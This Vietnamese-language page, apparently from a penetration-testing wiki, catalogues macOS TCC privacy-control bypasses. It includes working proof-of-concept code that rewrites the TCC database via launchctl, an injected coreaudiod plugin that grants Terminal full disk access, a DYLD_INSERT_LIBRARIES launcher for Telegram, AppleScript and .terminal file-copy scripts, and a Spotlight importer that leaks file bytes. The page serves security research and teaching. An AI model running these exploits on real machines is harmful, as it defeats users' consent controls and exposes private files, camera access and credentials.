# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

Để biết về nơi lưu trữ quyền cấp của TCC và cách quy kết sender/target cho Automation, xem [tổng quan về macOS TCC](../index.html#identify-apple-events-sender-and-target-grants).

## Theo chức năng

### Write Bypass

Đây không phải là một bypass, mà chỉ là cách TCC hoạt động: **TCC không bảo vệ khỏi thao tác ghi**. Nếu Terminal **không có quyền đọc Desktop của người dùng, nó vẫn có thể ghi vào đó**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Thuộc tính mở rộng **`com.apple.macl`** được thêm vào **file** mới để cấp quyền đọc file đó cho **ứng dụng tạo file**.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Có thể **đặt một cửa sổ đè lên lời nhắc TCC** để khiến người dùng **chấp nhận** mà không nhận ra. Bạn có thể tìm PoC tại [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Kẻ tấn công có thể **tạo ứng dụng với tên bất kỳ** (ví dụ: Finder, Google Chrome...) trong **`Info.plist`**, rồi yêu cầu quyền truy cập vào một vị trí được TCC bảo vệ. Người dùng sẽ tưởng ứng dụng hợp pháp đang yêu cầu quyền truy cập này.\
Ngoài ra, có thể **xóa ứng dụng hợp pháp khỏi Dock rồi đặt ứng dụng giả mạo vào đó**. Khi người dùng nhấp vào ứng dụng giả mạo (có thể dùng cùng biểu tượng), ứng dụng này có thể gọi ứng dụng hợp pháp, yêu cầu quyền TCC rồi thực thi malware, khiến người dùng tin rằng ứng dụng hợp pháp đã yêu cầu quyền truy cập.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Tìm thêm thông tin và PoC tại:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Theo mặc định, truy cập qua **SSH từng có quyền "Full Disk Access"**. Để vô hiệu hóa quyền này, cần giữ SSH trong danh sách nhưng tắt quyền đi (xóa SSH khỏi danh sách sẽ không xóa các đặc quyền đó):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Theo mặc định, truy cập qua SSH từng có quyền "Full Disk Access". Để vô hiệu hóa quyền này, cần giữ SSH trong danh sách nhưng tắt quyền đi (xóa SSH...](<../../../../../images/image (1077).png>)

Tại đây có các ví dụ về **malware đã vượt qua được cơ chế bảo vệ này**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Lưu ý rằng hiện nay, để bật SSH, bạn cần cấp quyền **Full Disk Access**

### Handle extensions - CVE-2022-26767

Thuộc tính **`com.apple.macl`** được gán cho file để cấp cho **một ứng dụng nhất định quyền đọc file đó.** Thuộc tính này được thiết lập khi **kéo-thả** file lên ứng dụng hoặc khi người dùng **nhấp đúp** vào file để mở bằng **ứng dụng mặc định**.

Do đó, người dùng có thể **đăng ký một ứng dụng độc hại** để xử lý mọi phần mở rộng file và gọi Launch Services để **mở** bất kỳ file nào (nhờ vậy ứng dụng độc hại được cấp quyền đọc file đó).<sup>[[23]](#references)</sup>

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** cho phép giao tiếp với dịch vụ XPC **`com.apple.iCloudHelper`**, dịch vụ này sẽ **cung cấp token iCloud**.

**iMovie** và **Garageband** từng có entitlement này cùng các entitlement khác cho phép truy cập.

Để biết thêm **thông tin** về khai thác **lấy token iCloud** thông qua entitlement này, xem bài nói chuyện: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Rò rỉ dữ liệu qua tên thông báo Darwin của Spotlight importer

Spotlight importer có thể đọc file mà Spotlight chuyển cho callback `GetMetadataForFile`, ngay cả khi một tiến trình thông thường không có Full Disk Access không thể đọc file đó. Khác với [code injection vào tiến trình được TCC cấp quyền](../macos-tcc-credential-and-data-theft.md), cách này đòi hỏi phải có quyền truy cập ban đầu trên máy để cài đặt importer và chờ sự kiện lập chỉ mục Spotlight phù hợp. Importer bị sandbox giới hạn, nhưng thông báo Darwin chỉ có tên vẫn có thể mang byte đến listener bên ngoài sandbox. Đây là kênh rò rỉ dữ liệu, không phải cách để importer đạt quyền root hoặc truy cập file tùy ý.<sup>[[24]](#references)</sup>

Khai báo loại file mục tiêu trong `CFBundleDocumentTypes` → `LSItemContentTypes` của `Info.plist` của importer, sau đó cài bundle vào `~/Library/Spotlight/` hoặc `Contents/Library/Spotlight/` của một ứng dụng. Kiểm tra đăng ký bằng `mdimport -L`. Phần [Spotlight importer](../../../../macos-auto-start-locations.md#spotlight-plugins) giải thích vị trí đặt bundle và cách khớp loại file. Importer chỉ nhận những file mà Spotlight chọn nó để xử lý; importer hiện có thường được ưu tiên. Trên macOS 26 Tahoe, trong các thử nghiệm được báo cáo, `mdimport -i` không phải lúc nào cũng buộc lập chỉ mục đệ quy ngay lập tức, trong khi `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` yêu cầu lập chỉ mục lại các UTI mà importer đó khai báo hỗ trợ.<sup>[[24]](#references)</sup>

Để kiểm tra kênh này, khởi chạy listener bên ngoài sandbox bằng `notifyutil -w TEST_TEST_TEST`, rồi gửi thông báo bằng `CFNotificationCenterGetDarwinNotifyCenter()` với đối tượng và `userInfo` là `NULL`. Khác với thông báo phân tán có payload `userInfo`, thông báo Darwin chỉ chứa tên. Để truyền dữ liệu nhị phân, đăng ký listener bên ngoài cho các tên dạng số thập phân từ `0` đến `255` bằng `notify_register_dispatch`; ánh xạ đăng ký của mỗi callback sang giá trị byte tương ứng. Trong `GetMetadataForFile`, chỉ đọc `pathToFile` do Spotlight cung cấp và gửi từng byte dưới dạng tên thông báo số thập phân:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Listener tái tạo chuỗi byte thay vì tự đọc tệp được TCC bảo vệ. PoC đã công bố khôi phục 64 byte đầu tiên của `knowledgeC.db` từ một terminal không có FDA, trên macOS 26 khi SIP được bật. Đây là phương thức có băng thông thấp và không đáng tin cậy để sao chép hàng loạt: Spotlight có thể không lập chỉ mục hoặc lập chỉ mục lại tệp mục tiêu, còn các phiên bản importer chạy đồng thời có thể làm xen kẽ các luồng thông báo. Xem [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) để biết các cơ chế khác vượt qua ranh giới sandbox.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Một ứng dụng có quyền **`kTCCServiceAppleEvents`** sẽ có thể **điều khiển các ứng dụng khác**. Điều này có nghĩa là ứng dụng đó có thể **lạm dụng các quyền được cấp cho những ứng dụng khác**.<sup>[[2]](#references)</sup>

Để biết thêm thông tin về Apple Scripts, hãy xem:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Ví dụ: nếu một ứng dụng có **quyền Automation đối với `iTerm`**, như trong ví dụ này, **`Terminal`** có quyền truy cập vào iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Đối với iTerm

Terminal, dù không có FDA, có thể gọi iTerm, ứng dụng có FDA, rồi dùng nó để thực hiện các hành động:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Thông qua Finder

Hoặc nếu một App có quyền truy cập thông qua Finder, nó có thể chạy một script như sau:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Theo hành vi ứng dụng

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**tccd daemon** ở userland sử dụng biến **env** **`HOME`** để truy cập cơ sở dữ liệu TCC của người dùng tại: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Theo [bài đăng Stack Exchange này](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), vì TCC daemon chạy thông qua `launchd` trong domain của người dùng hiện tại, nên có thể **kiểm soát mọi biến môi trường** được truyền cho nó.<sup>[[19]](#references)</sup>\
Do đó, **attacker có thể đặt biến môi trường `$HOME`** trong **`launchctl`** để trỏ đến một **thư mục** **do mình kiểm soát**, **khởi động lại** **TCC** daemon, rồi **sửa trực tiếp cơ sở dữ liệu TCC** để tự cấp cho mình **mọi quyền TCC hiện có** mà không cần hỏi người dùng cuối.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes có quyền truy cập vào các vị trí được TCC bảo vệ, nhưng ghi chú mới tạo lại được **lưu ở một vị trí không được bảo vệ**. Vì vậy, kẻ tấn công có thể yêu cầu Notes sao chép một tệp được bảo vệ vào ghi chú, rồi truy cập dữ liệu đã sao chép từ vị trí không được bảo vệ:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` cùng với thư viện `libsecurity_translocate` có entitlement `com.apple.private.nullfs_allow`, cho phép nó tạo mount **nullfs**, và entitlement `com.apple.private.tcc.allow` với **`kTCCServiceSystemPolicyAllFiles`** để truy cập mọi tệp.

Có thể thêm thuộc tính quarantine vào "Library", gọi dịch vụ XPC **`com.apple.security.translocation`**, rồi dịch vụ này sẽ ánh xạ Library tới **`$TMPDIR/AppTranslocation/d/d/Library`**, nơi có thể **truy cập** tất cả tài liệu bên trong Library.

### CVE-2024-44131 - FileProvider symlink race

Các ứng dụng chuyển giao thao tác với tệp cho một **privileged helper** (ở đây là **`fileproviderd`** / `Files.app`) sẽ sao chép hoặc di chuyển các mục **thay mặt người dùng**, nên thao tác sao chép chạy với quyền của helper thay vì của caller.

Jamf Threat Labs cho thấy có thể **race** bước kiểm tra symlink được thực hiện trước thao tác: thay vì đặt symlink ở thành phần đường dẫn **cuối cùng** (vốn được kiểm tra), kẻ tấn công thay thế một thư mục **trung gian** trong đường dẫn **sau khi thao tác sao chép đã bắt đầu**. Khi đó, privileged helper sẽ đi theo liên kết do kẻ tấn công kiểm soát và đọc/ghi vào các vị trí được TCC bảo vệ **mà không hiển thị prompt**.<sup>[[5]](#references)</sup>

Các thư mục **không** được bảo vệ bằng UUID ngẫu nhiên trong đường dẫn (ví dụ `~/Library/Mobile Documents/com~apple~CloudDocs`) là mục tiêu dễ khai thác nhất, vì kẻ tấn công có thể đoán trước toàn bộ đường dẫn để race.

> [!TIP]
> Đây là pattern tổng quát cần tìm: **bất kỳ process có đặc quyền nào phân giải một đường dẫn nhiều lần** (kiểm tra rồi sử dụng, hoặc `rename()`/`copyfile()` phân giải riêng source và destination) đều có thể bị race bằng cách thay thế một thư mục ở giữa đường dẫn. Chỉ `O_NOFOLLOW_ANY`, `openat()` trên một directory FD đã mở, hoặc `realpath()` + kiểm tra lại mới thực sự khép được khoảng thời gian này.

Xem thêm trong [**bài viết của Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

Có thể build `libsqlite3` với `SQLITE_ENABLE_SQLLOG`, tùy chọn này bổ sung một logging hook được điều khiển bằng environment variable ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – với **mỗi database được mở**, một **bản sao của tệp database** và log các câu lệnh SQL sẽ được ghi vào `path` (thư mục này phải tồn tại từ trước).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – tạo **bản sao mới mỗi lần** mở/gắn một DB thay vì dùng lại bản hiện có.
- **`SQLITE_SQLLOG_CONDITIONAL`** – chỉ log một connection nếu có tệp `<database>-sqllog` bên cạnh DB chính.

Nếu có thể inject biến này vào một process có **FDA** và mở các database SQLite, process đó sẽ sẵn sàng **sao chép các database được bảo vệ** vào một thư mục do bạn kiểm soát. Vì tên tệp đích được tạo từ dữ liệu do kẻ tấn công kiểm soát, một **symlink được đặt sẵn ở đích** sẽ biến primitive này thành **arbitrary file write** với quyền của target process.

### **SQLITE_AUTO_TRACE**

Nếu đặt environment variable **`SQLITE_AUTO_TRACE`**, thư viện **`libsqlite3.dylib`** sẽ bắt đầu **ghi log** tất cả truy vấn SQL. Nhiều ứng dụng sử dụng thư viện này, nên có thể ghi log tất cả truy vấn SQLite của chúng.<sup>[[22]](#references)</sup>

Một số ứng dụng của Apple sử dụng thư viện này để truy cập thông tin được TCC bảo vệ.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Tìm kiếm các thao tác ghi file được điều khiển bằng biến môi trường

Hai mục trước là các ví dụ của cùng một kỹ thuật tổng quát, và đáng để tìm thêm: **các framework được tải vào ứng dụng có quyền TCC thường cung cấp các biến môi trường debug/logging khiến tiến trình tạo file tại đường dẫn do bên gọi kiểm soát**.

Quy trình tìm kiếm:

1. Chọn mục tiêu có FDA hoặc một quyền TCC giá trị khác (`Music`, `TV`, `Terminal`, agent MDM...) rồi liệt kê các framework mà nó liên kết (`otool -L`, `vmmap`).
2. Tìm chuỗi `getenv` trong các framework đó: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Đặt các biến ứng viên bằng `launchctl setenv NAME /path/you/control`, khởi chạy ứng dụng và theo dõi hoạt động trên filesystem bằng `fs_usage -w -f filesys <pid>` hoặc `sudo fs_usage | grep <path>`.
4. Nếu tiến trình **tạo hoặc đổi tên** một file trong thư mục của bạn, bạn đã có primitive ghi: trỏ đích đến một symlink (hoặc race một thư mục trung gian, như trong CVE-2024-44131 ở trên) để chuyển hướng thao tác ghi đến `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Có hai điều hạn chế kỹ thuật này. Thứ nhất, **các biến `DYLD_*` bị bỏ qua đối với binary hardened-runtime** trừ khi ứng dụng có entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("giá trị Boolean cho biết ứng dụng có thể bị ảnh hưởng bởi các biến môi trường của dynamic linker hay không; bạn có thể dùng chúng để inject code vào tiến trình của ứng dụng") — xem thêm [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Thứ hai, Apple gỡ từng biến debug của framework sau khi chúng được báo cáo, nên biến hoạt động trên một bản macOS thường sẽ bị loại bỏ ở bản kế tiếp. Nếu ứng dụng âm thầm từ chối khởi chạy sau khi bạn đặt một biến, hãy xem biến đó như đã bị lọc.<sup>[[7]](#references)[[8]](#references)</sup>

Xem [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) để tìm hiểu thủ thuật tương tự với các biến linker.

### Apple Remote Desktop

Với quyền root, bạn có thể bật dịch vụ này; **ARD agent sẽ có full disk access**, sau đó người dùng có thể lạm dụng quyền này để khiến agent sao chép một **TCC user database** mới.

## Bằng **NFSHomeDirectory**

TCC dùng một database trong thư mục HOME của người dùng để kiểm soát quyền truy cập vào các tài nguyên riêng của người dùng tại **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Vì vậy, nếu người dùng khởi động lại được TCC với biến môi trường $HOME trỏ đến **một thư mục khác**, họ có thể tạo một TCC database mới tại **/Library/Application Support/com.apple.TCC/TCC.db** và lừa TCC cấp bất kỳ quyền TCC nào cho bất kỳ ứng dụng nào.

> [!TIP]
> Lưu ý rằng Apple dùng giá trị được lưu trong hồ sơ người dùng, tại thuộc tính **`NFSHomeDirectory`**, làm **giá trị của `$HOME`**. Vì vậy, nếu bạn chiếm quyền được một ứng dụng có quyền sửa đổi giá trị này (**`kTCCServiceSystemPolicySysAdminFiles`**), bạn có thể **weaponize** tùy chọn này để bypass TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**POC đầu tiên** dùng [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) và [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) để sửa đổi thư mục **HOME** của người dùng.

1. Lấy blob _csreq_ của ứng dụng mục tiêu.
2. Tạo một file _TCC.db_ giả có quyền truy cập cần thiết và blob _csreq_.
3. Xuất mục Directory Services của người dùng bằng [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Sửa đổi mục Directory Services để đổi thư mục home của người dùng.
5. Nhập mục Directory Services đã sửa đổi bằng [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Dừng _tccd_ của người dùng rồi khởi động lại tiến trình.

POC thứ hai dùng **`/usr/libexec/configd`**, có `com.apple.private.tcc.allow` với giá trị `kTCCServiceSystemPolicySysAdminFiles`.\
Có thể chạy **`configd`** với tùy chọn **`-t`**, cho phép kẻ tấn công chỉ định **Bundle tùy chỉnh để tải**. Do đó, exploit **thay thế** phương thức dùng **`dsexport`** và **`dsimport`** để đổi thư mục home của người dùng bằng cách **code injection vào `configd`**.

Để biết thêm thông tin, xem [**báo cáo gốc**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Bằng process injection

Có nhiều kỹ thuật để inject code vào một tiến trình và lạm dụng quyền TCC của tiến trình đó:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ngoài ra, hình thức process injection phổ biến nhất được tìm thấy để bypass TCC là thông qua **plugins (load library)**.\
Plugins là phần code bổ sung, thường ở dạng library hoặc plist, được **ứng dụng chính tải vào** và thực thi trong context của ứng dụng đó. Vì vậy, nếu ứng dụng chính có quyền truy cập vào các file bị TCC hạn chế (thông qua quyền đã được cấp hoặc entitlements), **custom code cũng sẽ có quyền đó**.

### CVE-2020-27937 - Directory Utility

Ứng dụng `/System/Library/CoreServices/Applications/Directory Utility.app` có entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, tải plugins có phần mở rộng **`.daplug`** và **không bật hardened runtime**.

Để weaponize CVE này, **`NFSHomeDirectory`** được **thay đổi** (lạm dụng entitlement nêu trên) nhằm **chiếm quyền TCC database của người dùng** và bypass TCC.

Để biết thêm thông tin, xem [**báo cáo gốc**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** có các entitlements `com.apple.security.cs.disable-library-validation` và `com.apple.private.tcc.manager`. Entitlement đầu tiên **cho phép code injection**, còn entitlement thứ hai cấp quyền **quản lý TCC**.

Binary này cho phép tải **third-party plug-ins** từ thư mục `/Library/Audio/Plug-Ins/HAL`. Vì vậy, có thể **tải plugin và lạm dụng quyền TCC** bằng POC này:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Để biết thêm thông tin, hãy xem [**báo cáo gốc**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Plug-In của Device Abstraction Layer (DAL)

Các ứng dụng hệ thống mở luồng camera thông qua Core Media I/O (các ứng dụng có **`kTCCServiceCamera`**) sẽ tải **các plugin này vào tiến trình** từ `/Library/CoreMediaIO/Plug-Ins/DAL` (không bị SIP hạn chế).

Chỉ cần lưu một library có **constructor** thông thường tại đó là đủ để **inject code**.

Một số ứng dụng của Apple đã bị ảnh hưởng bởi lỗ hổng này.

### Firefox

Ứng dụng Firefox có các entitlement `com.apple.security.cs.disable-library-validation` và `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Để biết thêm thông tin về cách dễ dàng khai thác lỗi này, [**hãy xem báo cáo gốc**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` có các entitlement **`com.apple.private.tcc.allow`** và **`com.apple.security.get-task-allow`**, cho phép inject code vào tiến trình và sử dụng các quyền TCC.

### CVE-2023-26818 - Telegram

Telegram có các entitlement **`com.apple.security.cs.allow-dyld-environment-variables`** và **`com.apple.security.cs.disable-library-validation`**, nên có thể lạm dụng ứng dụng để **truy cập các quyền của nó**, chẳng hạn như quyền ghi hình bằng camera. Bạn có thể [**tìm payload trong bài viết chi tiết**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Lưu ý rằng để dùng biến môi trường tải một thư viện, người ta đã tạo một **plist tùy chỉnh** để inject thư viện này và dùng **`launchctl`** để khởi chạy nó:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Bằng cách gọi open

Có thể gọi **`open`** ngay cả khi đang ở trong sandbox

### Terminal Scripts

Việc cấp **Full Disk Access (FDA)** cho terminal khá phổ biến, ít nhất là trên các máy tính được dân công nghệ sử dụng. Và có thể gọi các script **`.terminal`** bằng terminal đó.

Các script **`.terminal`** là các file plist như ví dụ này, chứa lệnh cần thực thi trong khóa **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Một ứng dụng có thể ghi một script terminal vào một vị trí như /tmp rồi khởi chạy nó bằng một lệnh như:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Bằng cách mount

### CVE-2020-9771 - mount_apfs TCC bypass và leo thang đặc quyền

**Bất kỳ người dùng nào** (kể cả người dùng không có đặc quyền) đều có thể tạo và mount snapshot của Time Machine, rồi **truy cập TẤT CẢ các tệp** trong snapshot đó.\
**Đặc quyền duy nhất** cần thiết là ứng dụng được sử dụng (như `Terminal`) phải có quyền **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), và quyền này cần được admin cấp.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Có thể xem [**bản báo cáo gốc**](https://theevilbit.github.io/posts/cve_2020_9771/)** để biết giải thích chi tiết hơn.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount đè lên tệp TCC

Ngay cả khi tệp TCC DB được bảo vệ, vẫn có thể **mount đè lên thư mục** một tệp TCC.db mới:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Kiểm tra **full exploit** trong [**bài viết gốc**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Như giải thích trong [bài viết gốc](https://www.kandji.io/blog/macos-audit-story-part2), CVE này khai thác `diskarbitrationd`.<sup>[[16]](#references)</sup>

